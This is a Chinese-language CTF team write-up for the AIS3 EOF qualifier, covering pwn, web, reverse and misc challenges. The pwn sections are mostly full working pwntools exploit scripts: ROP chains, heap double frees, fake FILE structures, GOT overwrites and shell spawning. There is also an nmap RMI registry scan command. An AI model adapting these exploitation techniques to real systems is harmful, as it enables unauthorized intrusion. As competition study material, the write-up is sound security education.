# AIS3 eof 初賽 Writeup

隊名: bolqs
18th place
1710 points
pi3la(莊人傑) 1052, zodf0055980(吳宗遠) 658, shyang(陳宇翔) 0

# Pwn

## Impossible

* int len
* abs(0x80000000) = 0x80000000
* read(0, buf, 2147483648)
    * read(int, void*, size_t)
* size_t 是 unsigned 所以可以 overflow
* ret2csu -> one_gadget

```python=
from pwn import *
import time
import sys


def exploit():
    if len(sys.argv) <= 1:
        input('attach to pid: {}'.format(proc.proc.pid))
    csu_init = 0x400866
    call_csu = 0x400850
    puts_got = 0x601018
    read_got = 0x601028
    magic = 0x601000
    pop_r14_r15 = 0x400870
    proc.sendlineafter(b':', '2147483648')
    buf = b'A' * 0x108
    buf += flat(csu_init, 0, 0, 1, puts_got, puts_got, 0, 0, call_csu)
    buf += flat(0, 0, 1, read_got, 0, magic, 8, call_csu)
    buf += flat(0, 0, 1, magic, 0, 0, 0, pop_r14_r15, 0, 0, call_csu)
    buf += b'\x00' * 0x100
    proc.send(buf)
    proc.recvuntil(b':)\n')
    libc = proc.recvuntil(b'\x7f')
    libc = u64(libc + b'\x00\x00')
    libc -= 0x809c0
    log.info('libc: ' + hex(libc))
    one_gadget = libc + 0x10a38c
    one_gadget = libc + 0x4f322
    proc.send(p64(one_gadget))


if __name__ == '__main__':
    context.arch = 'amd64'
    connect = 'nc eductf.zoolab.org 10105'
    connect = connect.split(' ')
    if len(sys.argv) > 1:
        proc = remote(connect[1], int(connect[2]))
    else:
        proc = process(['./impossible'], env={'LD_LIBRARY_PATH': './'})
    exploit()
    proc.interactive()
```

## nonono

* bss 上的東西可以隨便 leak ，剛好看到 index = -7 可以 leak program base
* 因為有 tcache, free 0x100 的 chunk 第八次讓他進 unsorted bin
* 然後 new note (size: 0) 拿到 libc address
* 偽造 FILE 結構 (stdin) 做任意寫，把 one_gadget 寫進 free hook

```python=
from pwn import *k
import time
import sys


def new_note(ind, size, content):
    proc.sendlineafter(b'>>', b'1')
    buf = f'{ind}\n{size}\n'.encode()
    buf += content
    proc.sendafter(b': ', buf)
    #proc.sendlineafter(b': ', f'{ind}'.encode())
    #proc.sendlineafter(b': ', f'{len(content)+1}'.encode())
    #proc.sendlineafter(b': ', content)


def del_note(ind):
    proc.sendlineafter(b'>>', b'3')
    proc.sendlineafter(b': ', f'{ind}'.encode())


def show(ind):
    proc.sendlineafter(b'>>', b'2')
    proc.sendlineafter(b': ', f'{ind}'.encode())
    return proc.recvuntil(b'=')


def exploit():
    if len(sys.argv) <= 1:
        input('attach to pid: {}'.format(proc.proc.pid))
    # fake in bss
    # leak heap
    proc.sendlineafter(b'>>', b'2')
    proc.sendlineafter(b': ', b'-7')
    prog_base = proc.recvuntil(b'=')
    prog_base = u64(prog_base[:6] + b'\x00\x00')
    prog_base -= 0x202008
    log.info('prog: ' + hex(prog_base))

    for i in range(8):
        new_note(i, 0x100, b'\n')
    for i in range(8):
        del_note(7 - i)
    new_note(0, 0, b'')
    libc = show(0)
    libc = u64(libc[:6].ljust(8, b'\x00'))
    libc -= 0x3aeda0
    log.info('libc: ' + hex(libc))

    vtable = libc + 0x3ab2a0
    free_hook = libc + 0x3b08e8
    write_adr = free_hook - 4
    size = 14
    lock = prog_base + 0x202800
    fake_stdin = [0x00000000fbad208b, write_adr,
            write_adr, write_adr,
            write_adr, write_adr,
            write_adr, write_adr,
            write_adr + size, 0x0000000000000000,
            0x0000000000000000, 0x0000000000000000,
            0x0000000000000000, 0x0000000000000000,
            0x0000001000000000, 0xffffffffffffffff,
            0x0000000000000000, lock,
            0xffffffffffffffff, 0x0000000000000000,
            0x00007fced5aadae0, 0x0000000000000000,
            0x0000000000000000, 0x0000000000000000,
            0x00000000ffffffff, 0x0000000000000000,
            0x0000000000000000, vtable]


    #free_got = prog_base + 0x201f70
    #read_adr = free_got
    #size = 6
    #buf = flat(0xfbad2887, read_adr, read_adr, read_adr,
    #        read_adr, read_adr + size, read_adr + size,
    #        read_adr, read_adr + 1, 0, 0, 0, 0, 0, 1, -1, 0,
    #        lock, -1, 0, 0, 0, 0, 0, -1)
    buf = flat(*fake_stdin)
    assert b'\n' not in buf[:-1]
    buf += b'\n'
    new_note(0, 0xf0, buf)
    del_note(0)
    new_note(-2, 0xf0, b'\n')
    libc -= 0x3d000
    new_note(0, 9, p64(libc + 0x4f322))
    del_note(0)



if __name__ == '__main__':
    context.arch = 'amd64'
    connect = 'nc eductf.zoolab.org 20005'
    connect = connect.split(' ')
    if len(sys.argv) > 1:
        proc = remote(connect[1], int(connect[2]))
    else:
        proc = process(['./nonono'], env={'LD_LIBRARY_PATH': './'})
    exploit()
    proc.interactive()
```

## BlueNote

* windows pwn 簡單的 overflow 但是在 windows 上 Orz
* 可以新增五個 note (0~4), 滿了之後會問你要複寫調哪個 note 這時的 index 可以給 5 就能做 stack buffer overflow
* 可以 leak canary, program base, kernel32.dll, ntdll.dll (一開始以為 ntdll 不能 leak 然後又因為 local, remote 用的 dll 不一致 debug 超久QQ)
* ROP 讀 flag.txt (堆 ROP 堆到差點沒死)
* 用 xchg eax, ecx; ret; 把上個 function 的回傳值放到 ecx 給下個 function 用
* windows api calling convention: func(rcx, rdx, r8, r9, stack...)
* 做 stackpivoting 的時候發現 program 本身的 bss 段太小 (0x1000) windows api 初始化的時候 rsp 會減超大(好像)所以換到 ntdll 上才成功

```python=
from pwn import *
import time
import sys


def add(ind, data):
    assert len(data) <= 0x100
    proc.sendlineafter(b':', b'1')
    proc.sendlineafter(b':', f'{ind}'.encode())
    proc.sendafter(b':', data)


def show(ind):
    proc.sendlineafter(b':', b'2')
    proc.sendlineafter(b':', f'{ind}'.encode())
    return proc.recvuntil(b'*********')


def exploit():
    for i in range(5):
        proc.sendlineafter(b':', b'1')
        proc.sendafter(b':', b'A' * 0x100)
    add(5, b'B' * 8)
    leak = show(5).replace(b'\r\n', b'\n')
    print(leak)
    canary = leak[0x50:0x58]
    print(canary)
    canary = u64(canary)
    prog_base = leak[0x60:0x68]
    print(prog_base)
    prog_base = u64(prog_base)
    prog_base -= 0x1734
    kernel32 = leak[0xa0:0xa8]
    print(kernel32)
    kernel32 = u64(kernel32)
    ntdll = leak[0xd0:0xd8]
    print(ntdll)
    ntdll = u64(ntdll)
    if len(sys.argv) <= 1:
        # local
        ntdll -= 0x6a271
        kernel32 -= 0x17974
        # local
        pop_rax = kernel32 + 0x63b6
        leave_and_ac_ret = kernel32 + 0x5a49d
        jmp_ptr_rbx = kernel32 + 0x36035
        pop_rcx = ntdll + 0x9217b
        pop_rdx_r11 = ntdll + 0x8fb37
        pop_r89ab = ntdll + 0x8fb32
        xchg_eax_ecx = ntdll + 0x228ef
        getstdhandle = kernel32 + 0x1c890
        readfile = kernel32 + 0x22680
        pop_rsp = ntdll + 0x30f2
        createfile = kernel32 + 0x222F0
    else:
        # remote
        ntdll -= 0x6ced1
        kernel32 -= 0x17bd4
        # remote
        pop_rax = kernel32 + 0x6e76
        leave_and_ac_ret = kernel32 + 0x59dfd
        jmp_ptr_rbx = kernel32 + 0x3920b
        pop_rcx = ntdll + 0x21597
        pop_rdx_r11 = ntdll + 0x8c4b7
        pop_r89ab = ntdll + 0x8c4b2
        xchg_eax_ecx = ntdll + 0x87ebb
        getstdhandle = kernel32 + 0x1c610
        readfile = kernel32 + 0x22410
        pop_rsp = ntdll + 0xb416
        createfile = kernel32 + 0x22080

    log.info('canary: ' + hex(canary))
    log.info('prog_base: ' + hex(prog_base))
    log.info('kernel32: ' + hex(kernel32))
    log.info('ntdll: ' + hex(ntdll))

    pop_rsp_addrsp_0x20_pop_rdi = prog_base + 0x1ec7
    puts_menu = prog_base + 0x11bc
    main = prog_base + 0x1070
    pop_rbx = prog_base + 0x1063
    puts_iat = prog_base + 0x31b0
    exit = prog_base + 0x14a4
    index_str = prog_base + 0x328c
    write_iat = prog_base + 0x3190
    stack = ntdll + 0x15f000 + 0x4000

    read_menu = prog_base + 0x1337
    getstdhandle_iat = prog_base + 0x3008
    # buf = b'B' * 0x50 , canary, rbp, ret
    buf = flat(b'B' * 0x50, canary, stack - 0x480, pop_rcx, 0xfffffff6,
            getstdhandle, xchg_eax_ecx,
            pop_r89ab, 0x600, stack - 8, 0, 0, pop_rdx_r11, stack, 0,
            pop_rbx, 0, readfile, pop_rsp, stack + 0x100)
    add(5, buf)
    input('a')
    proc.sendlineafter(b':', b'3')
    input('wait')

    if len(sys.argv) <= 1:
        # local
        add_rsp38 = ntdll + 0x2a3b
    else:
        # remote
        add_rsp38 = ntdll + 0x26fb
    createfileflag = 0x80 | 0x40000000
    createfileflag = 1
    buf = flat(b'flag.txt'.ljust(0x100, b'\x00'), pop_rcx, stack,
            pop_rdx_r11, 0x80000000, 0, pop_r89ab, 1, 0, 0, 0,
            createfile, add_rsp38, 0, 0, 0, 0, 3, createfileflag, 0,
            xchg_eax_ecx, pop_rdx_r11, stack, 0, pop_r89ab, 0x20, stack - 8,
            0x41, 0x41, readfile, add_rsp38, 0x41, 0x41, 0x41, 0x41, 0, 0x41, 0x41,
            pop_rcx, stack, puts_menu)
    proc.sendline(buf)


if __name__ == '__main__':
    context.arch = 'amd64'
    if len(sys.argv) > 1:
        connect = 'nc eductf.zoolab.org 30001'
        connect = connect.split(' ')
        proc = remote(connect[1], int(connect[2]))
    else:
        connect = 'nc 192.168.9.1 30001'
        connect = connect.split(' ')
        proc = remote(connect[1], int(connect[2]))
    exploit()
    proc.interactive()
```

## re-alloc (solved after EOF)

* allocate 有 one NULL byte overflow
* 猜測要利用 NULL byte 拿到大意點的 chunk
* 然後做類似 NULL byte poison 的方法
* 賽後發現 realloc 時 size 給 0 可以 double free!!!!
* 利用 fastbin dup 和 tcache 的特性可以隨意寫 got
* atoll -> printf 用 format string 來 leak
* 因為 printf("%400p") 會回傳 400 所以原本的 read_long 還是可以正常用
* 只是要先準備好兩塊可以馬上 alloc 到 atoll_got 的 chunk 比較麻煩, 導致 0x20 的 fastbin 充滿了一堆垃圾XD
* 所以那個 NULL byte 只是寫錯(?

```python=
from pwn import *
import time
import sys


def alloc(ind, size, data):
    proc.sendlineafter(b': ', b'1')
    proc.sendlineafter(b':', f'{ind}'.encode())
    proc.sendlineafter(b':', f'{size}'.encode())
    proc.sendafter(b':', data)

def realloc(ind, size, data):
    proc.sendlineafter(b': ', b'2')
    proc.sendlineafter(b':', f'{ind}'.encode())
    proc.sendlineafter(b':', f'{size}'.encode())
    proc.sendafter(b':', data)

def realloc_free(ind):
    proc.sendlineafter(b': ', b'2')
    proc.sendlineafter(b':', f'{ind}'.encode())
    proc.sendlineafter(b':', b'0')

def free(ind):
    proc.sendlineafter(b': ', b'3')
    proc.sendlineafter(b':', f'{ind}'.encode())

def exit():
    proc.sendlineafter(b': ', b'4')

def printf(buf):
    proc.sendlineafter(b': ', b'3')
    proc.sendafter(b':', buf)


def overlap(size):
    for i in range(7):
        alloc(0, 0x18, b'A')
        realloc(0, size, b'A')
        free(0)
    alloc(0, 0x18, b'A')
    realloc(0, size, b'A')
    alloc(1, 0x18, b'A')
    realloc(1, size, b'A')
    realloc_free(0)
    free(1)
    free(0)
    for i in range(7):
        alloc(0, size, b'A')
        realloc(0, 0x18, b'A')
        free(0)

def set_target(size, target):
    alloc(0, size, p64(target))
    for i in range(size - 0x20, 0, -0x20):
        realloc(0, i, p64(target))
    for i in range(2):
        alloc(1, size, b'A')
        for j in range(size - 0x20, 0, -0x20):
            realloc(1, j, b'A')
        free(1)
    free(0)


def exploit():
    if len(sys.argv) <= 1:
        input('attach to pid: {}'.format(proc.proc.pid))
    atoll_got = 0x404048
    printf_plt = 0x401076

    overlap(0x58)
    overlap(0x78)
    for i in range(7):
        alloc(0, 0x58, b'A')
        realloc(0, 0x18, b'A')
        free(0)
    set_target(0x58, atoll_got)
    set_target(0x78, atoll_got)

    alloc(0, 0x58, flat(printf_plt))
    printf("%p|%p|%p>>>")
    libc = proc.recvuntil(b'>>>').split(b'|')[2]
    libc = int(libc[:-3], 16)
    if len(sys.argv) <= 1:
        # local
        libc -= 0x101ac9
        system = libc + 0x41c50
    else:
        # remote
        libc -= 0x12e009
        system = libc + 0x52fd0
    log.info('libc: ' + hex(libc))

    # alloc(1, 0x78, p64(system))
    proc.sendlineafter(b': ', b'1')
    proc.sendafter(b':', b'A' * 1)
    proc.sendafter(b':', b'%120p')
    proc.sendafter(b':', p64(system))
    proc.sendlineafter(b': ', b'1')
    proc.sendlineafter(b':', b'/bin/sh')
    proc.sendline(b'cat /home/re-alloc/flag')
    # FLAG{Heeeeeeeeeeeeeeeeeeeeeee4p}


if __name__ == '__main__':
    context.arch = 'amd64'
    connect = 'nc eductf.zoolab.org 10106'
    connect = connect.split(' ')
    if len(sys.argv) > 1:
        proc = remote(connect[1], int(connect[2]))
    else:
        proc = process(['./re-alloc'])
    exploit()
    proc.interactive()
```

# Web
## babyRMI
他有給 java 檔和編譯過程，在 RMIIntervase 中有定義兩個回傳的 function，而把 `tring response = stub.sayHello()` 給換成別的 function 可以看到提示為要找別的 object。
首先不小心以為裡面給的網站是用 rmi server 架的，但一直找不到有類似 `rmi://` 的東西，後來發現那根本是放辛酸的....，差點就打出 CVE 了 = =
之後用 nmap 去掃出 rmi 的 object
https://nmap.org/nsedoc/scripts/rmi-dumpregistry.html
不知為何這裡的 nmap 要加 -sV 才掃得出來
`nmap -sV -script rmi-dumpregistry -p 11099 140.113.203.209`
就能拿到別的 object name。
# Reverse
## YugiMuto
reverse gameboy...
首先先下載 gba 的 gdb
http://bgb.bircd.org/?fbclid=IwAR0SySTO5XQrKXw2f3cmT8NOsFeeSBK35mrxwfuFpP0vo2whTfU-zVaBYUE
之後他會卡在一個地方，把他的 z patch 掉就好
![](https://i.imgur.com/RTSJ0hg.png)

之後去 trace code，當你按輸入時會進入 0x0e00 的 function，並把自己輸入的東西放到 0xc79a 裡面，因此就可以透過自己的輸入去建立一個表格

![](https://i.imgur.com/6jgVWKD.png)

|  A   |  B   |  C   |
| ---- | ---- | ---- |
| 0x02 | 0x03 | 0x04 |
|  K   |  L   |  M   |
| 0x0C | 0x0D | 0x0E |
以此類推，之後去 trace 按下確定送出時的 code，但發現一直找不到感覺是去檢查的程式碼，之後直開 ida ，指令集選擇 z80
之後發現 ida 雖然可以透過去 deassemble 自己所指定的位置(因為之前已經有得到輸入時程式碼的進入點)，但無法 decompiler。
用 ida 可以看到按下確定有 4 條路徑，分別是確定，選數字，刪除，另一條要 patch 會讓輸入會變成特殊的字元
之後直接改換 ghidra ，不愧是 NASA 做的居然可以 decompile
可以找到比對程式碼的地方
```clike=
void FUN_ram_0e61(char *param_1,short *param_2,ushort param_3)

{

  ....................前略
  *(char *)param_2 = (char)param_2;
  *(undefined *)((short)param_2 + 1) = (char)((ushort)param_2 >> 8);
  *(undefined *)*param_2 = 0x10;
  *(undefined *)(*param_2 + 1) = 9;
  *(undefined *)(*param_2 + 2) = 0xe;
  sVar3 = *param_2;
  *(undefined *)(short *)(sVar3 + 3) = 0x1a;
  if ((bool)(bVar4 >> 7)) {
    return;
  }
  psVar9 = (short *)(*(short *)(sVar3 + 3) + 4);
  *(undefined *)psVar9 = 8;
  if ((bool)(bVar4 >> 7)) {
    return;
  }
  psVar9 = (short *)(*psVar9 + 5);
  *(undefined *)psVar9 = 0x10;
  if ((bool)(bVar4 >> 7)) {
    return;
  }
  psVar9 = (short *)(*psVar9 + 6);
  *(undefined *)psVar9 = 5;
  if ((bool)(bVar4 >> 7)) {
    return;
  }
  psVar9 = (short *)(*psVar9 + 7);
  *(undefined *)psVar9 = 0x1a;
  if ((bool)(bVar4 >> 7)) {
    return;
  }
  psVar9 = (short *)(*psVar9 + 8);
  *(undefined *)psVar9 = 0x20;
  if ((bool)(bVar4 >> 7)) {
    return;
  }
  psVar9 = (short *)(*psVar9 + 9);
  *(undefined *)psVar9 = 0x16;
  if ((bool)(bVar4 >> 7)) {
    return;
  }
  psVar9 = (short *)(*psVar9 + 10);
  *(undefined *)psVar9 = 2;
  if ((bool)(bVar4 >> 7)) {
    return;
  }
  psVar9 = (short *)(*psVar9 + 0xb);
  *(undefined *)psVar9 = 0x13;
  if ((bool)(bVar4 >> 7)) {
    return;
  }
  psVar9 = (short *)(*psVar9 + 0xc);
  *(undefined *)psVar9 = 6;
  if ((bool)(bVar4 >> 7)) {
    return;
  }
  psVar9 = (short *)(*psVar9 + 0xd);
  *(undefined *)psVar9 = 8;
  if ((bool)(bVar4 >> 7)) {
    return;
  }
  psVar9 = (short *)(*psVar9 + 0xe);
  *(undefined *)psVar9 = 2;
  if ((bool)(bVar4 >> 7)) {
    return;
  }
  psVar9 = (short *)(*psVar9 + 0xf);
  *(undefined *)psVar9 = 0xe;
  if ((bool)(bVar4 >> 7)) {
    return;
  }
  psVar9 = (short *)(*psVar9 + 0x10);
  *(undefined *)psVar9 = 0x23;
  if ((bool)(bVar4 >> 7)) {
    return;
  }
  psVar9 = (short *)(*psVar9 + 0x11);
  *(undefined *)psVar9 = 3;
  if ((bool)(bVar4 >> 7)) {
    return;
  }
  psVar9 = (short *)(*psVar9 + 0x12);
  *(undefined *)psVar9 = 0x20;
  if ((bool)(bVar4 >> 7)) {
    return;
  }
  *(undefined *)(*psVar9 + 0x13) = 0x1a;
  DAT_ram_c798 = 0;
  while( true ) {
    bVar4 = SBORROW1(DAT_ram_c798,'\x14') << 2 | 2U | DAT_ram_c798 < 0x14;
    if (DAT_ram_c798 >= 0x14) break;
    if ((char)(DAT_ram_c798 - 0x14) < '\0') {
      return;
    }
    cVar5 = *(char *)((ushort)DAT_ram_c798 + CONCAT11(DAT_ram_c799,DAT_ram_c798));
    cVar6 = *(char *)CONCAT11((0x65 < DAT_ram_c798) + -0x39,DAT_ram_c798 + 0x9a);
    bVar4 = SBORROW1(cVar6,cVar5) << 2 | 2;
    if (cVar6 != cVar5) break;
    DAT_ram_c798 = DAT_ram_c798 + 1;
  }
  if ((bool)(bVar4 >> 2)) {
    return;
  }
  return;
}
```
可以看到在 131 行開始就是比較的程式碼了，發現他前面有去檢查輸入的長度，難怪之前找不到，原來是在最前面就被擋掉了。
把 `*param_2` 拚回來並透過之前的表格解碼即可。而且 flag 長度會超過輸入，所以只能透過 reverse。
我有在某一次嘗試時不小心把判斷給 patch 掉，是有成功頁面的，但不會顯示 flag QAQ，也忘記 patch 哪行。

## H0W (solved after EOF)
很麻煩的 reverse，他會去呼叫自己寫的 so 檔共 6 個 function
```
nini1() # github = time(0)
nini2(): # get time sprint
nini3() # output.txt
nini4() # srand(github)
nini6() # ittle endian to 4 char
```
前5個 function 大概功能長這樣，但重點在 `nini5`
他會透過 rand ％ 4 產生一亂數並以此呼叫4個 function
```
.data:0000000000202200    otakunokokyu    dq offset ichinokata
.data:0000000000202208                 dq offset ninokata
.data:0000000000202210                 dq offset sannokata
.data:0000000000202218                 dq offset yonnokata
```
每個 function 分別會有各自的值和回傳
而且 libc rand 是用 c 的而不是 python 的，整個就超麻煩就放棄啦QAQ
賽後想說解到一半把他補上，學了一下 c type 怎麼用。發現 python 做 xor 或是 shift 會和 c 不一樣，且別人拿到時間都是用格林威治時間，而我電腦則是要是自己時區才會是正確的 = =


# Misc
## Ponzi Scheme
龐式騙局可以看啾啾鞋的某一集影片。
這題是帳號有 3 種方式可以賺錢，分別是要等 6 秒，3 分鐘，30分鐘。而賺錢要領到錢時投資池有足夠的錢就可以拿到錢，不然就那個帳號就GG了。~~跟我的每一個帳號一樣~~
解法就~~跟實驗室同學要錢~~養一堆小號，等本尊快領錢時把錢丟進去給他宰，就能成功了。
pow 是算 `SHA256( XXXXXX + answer)` has 22 leading zero bits，可以透過 balsn 提供的程式破解 https://balsn.tw/proof-of-work/

